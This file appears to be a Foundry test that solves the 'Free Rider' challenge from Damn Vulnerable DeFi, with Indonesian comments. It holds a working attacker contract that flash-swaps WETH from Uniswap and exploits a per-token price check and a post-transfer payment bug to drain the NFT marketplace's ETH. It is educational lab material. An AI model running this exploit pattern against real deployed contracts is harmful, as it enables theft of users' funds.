// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";

// Kontrak penyerang: flash swap 15 WETH dari Uniswap -> unwrap jadi ETH
// -> beli 6 NFT sekaligus -> lunasi flash swap -> antar NFT ke buyer
// contract -> teruskan sisa ETH ke attacker EOA.
contract FreeRiderAttacker is IERC721Receiver {
    IUniswapV2Pair internal pair;
    WETH9 internal weth;
    FreeRiderNFTMarketplace internal marketplace;
    DamnValuableNFT internal nft;
    FreeRiderBuyer internal buyerContract;
    address payable internal attacker;

    uint256 internal constant FLASH_WETH = 15 ether;
    // Fee flash swap 0,3%: butuh 15 / 0,997 = 15,0451... WETH.
    // Bayar 15,1 WETH untuk margin.
    uint256 internal constant REPAY_WETH = 15.1 ether;

    constructor(
        address pairAddress,
        address wethAddress,
        address marketplaceAddress,
        address nftAddress,
        address buyerContractAddress,
        address attackerAddress
    ) {
        pair = IUniswapV2Pair(pairAddress);
        weth = WETH9(payable(wethAddress));
        marketplace = FreeRiderNFTMarketplace(payable(marketplaceAddress));
        nft = DamnValuableNFT(nftAddress);
        buyerContract = FreeRiderBuyer(payable(buyerContractAddress));
        attacker = payable(attackerAddress);
    }

    receive() external payable {}

    // Wajib ada: marketplace mengirim NFT via safeTransferFrom, yang
    // menolak recipient kontrak tanpa onERC721Received.
    function onERC721Received(address, address, uint256, bytes calldata)
        external
        pure
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack() external {
        // Pinjam 15 WETH (token1) via flash swap; callback uniswapV2Call
        // dipanggil pair sebelum cek invariant.
        pair.swap(0, FLASH_WETH, address(this), bytes("flash"));
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == address(pair), "Only pair");
        // (1) WETH -> ETH
        weth.withdraw(FLASH_WETH);
        // (2) Beli 6 NFT dengan SATU msg.value 15 ETH: _buyOne hanya
        //     mengecek msg.value >= harga PER token (bukan total), dan
        //     pembayaran dikirim ke ownerOf SETELAH transfer — yaitu
        //     pembeli sendiri. Jadi tiap NFT "dibayar" 15 ETH lalu
        //     15 ETH itu kembali ke kontrak ini: 6 NFT + refund 90 ETH.
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: FLASH_WETH}(tokenIds);
        // (3) Lunasi flash swap sebelum callback selesai (cek invariant
        //     pair dilakukan setelah callback kembali).
        weth.deposit{value: REPAY_WETH}();
        weth.transfer(address(pair), REPAY_WETH);
    }

    function deliverAndWithdraw() external {
        // Antar 6 NFT ke buyer contract (onERC721Received membayar
        // 45 ETH ke attacker EOA pada NFT ke-6; tx.origin harus attacker).
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(buyerContract), i);
        }
        // Teruskan sisa ETH (refund marketplace - pelunasan flash swap)
        // ke attacker EOA.
        payable(attacker).transfer(address(this).balance);
    }
}

contract FreeRider is Test {
    // The NFT marketplace will have 6 tokens, at 15 ETH each
    uint256 internal constant NFT_PRICE = 15 ether;
    uint8 internal constant AMOUNT_OF_NFTS = 6;
    uint256 internal constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    // The buyer will offer 45 ETH as payout for the job
    uint256 internal constant BUYER_PAYOUT = 45 ether;

    // Initial reserves for the Uniswap v2 pool
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 15_000e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;
    uint256 internal constant DEADLINE = 10_000_000;

    FreeRiderBuyer internal freeRiderBuyer;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableToken internal dvt;
    DamnValuableNFT internal damnValuableNFT;
    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;
    WETH9 internal weth;
    address payable internal buyer;
    address payable internal attacker;
    address payable internal deployer;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        buyer = payable(address(uint160(uint256(keccak256(abi.encodePacked("buyer"))))));
        vm.label(buyer, "buyer");
        vm.deal(buyer, BUYER_PAYOUT);

        deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
        vm.label(deployer, "deployer");
        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE);

        // Attacker starts with little ETH balance
        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.5 ether);

        // Deploy WETH contract
        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy token to be traded against WETH in Uniswap v2
        vm.startPrank(deployer);
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory =
            IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // Note that the function takes care of deploying the pair automatically
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));

        assertEq(uniswapV2Pair.token0(), address(dvt));
        assertEq(uniswapV2Pair.token1(), address(weth));
        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);

        damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());

        for (uint8 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(damnValuableNFT.ownerOf(id), deployer);
        }

        damnValuableNFT.setApprovalForAll(address(freeRiderNFTMarketplace), true);

        uint256[] memory NFTsForSell = new uint256[](6);
        uint256[] memory NFTsPrices = new uint256[](6);
        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
            NFTsForSell[i] = i;
            NFTsPrices[i] = NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        freeRiderNFTMarketplace.offerMany(NFTsForSell, NFTsPrices);

        assertEq(freeRiderNFTMarketplace.amountOfOffers(), AMOUNT_OF_NFTS);
        vm.stopPrank();

        vm.startPrank(buyer);

        freeRiderBuyer = new FreeRiderBuyer{value: BUYER_PAYOUT}(
            attacker,
            address(damnValuableNFT)
        );

        vm.stopPrank();

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // Root cause (2 cacat yang bergabung di _buyOne):
        // (1) buyMany mengecek msg.value >= harga PER token, bukan
        //     TOTAL — satu msg.value 15 ETH lolos untuk keenam NFT
        //     (seharusnya 90 ETH); (2) pembayaran dikirim ke
        //     token.ownerOf(tokenId) SETELAH transfer — yaitu pembeli
        //     sendiri. Jadi pembeli membayar 15 ETH, mendapat 6 NFT,
        //     dan menerima kembali 90 ETH dari saldo marketplace.
        // Modal 15 ETH didapat via flash swap Uniswap (15 WETH, lunas
        //     15,1 WETH incl. fee 0,3%). Lalu 6 NFT diantar ke buyer
        //     contract -> payout 45 ETH ke attacker EOA.
        FreeRiderAttacker attackerContract = new FreeRiderAttacker(
            address(uniswapV2Pair),
            address(weth),
            address(freeRiderNFTMarketplace),
            address(damnValuableNFT),
            address(freeRiderBuyer),
            attacker
        );

        vm.startPrank(attacker, attacker);
        attackerContract.attack();
        attackerContract.deliverAndWithdraw();
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */

        // Attacker must have earned all ETH from the payout
        assertGt(attacker.balance, BUYER_PAYOUT);
        assertEq(address(freeRiderBuyer).balance, 0);

        // The buyer extracts all NFTs from its associated contract
        vm.startPrank(buyer);
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            damnValuableNFT.transferFrom(address(freeRiderBuyer), buyer, tokenId);
            assertEq(damnValuableNFT.ownerOf(tokenId), buyer);
        }
        vm.stopPrank();

        // Exchange must have lost NFTs and ETH
        assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
        assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
    }
}
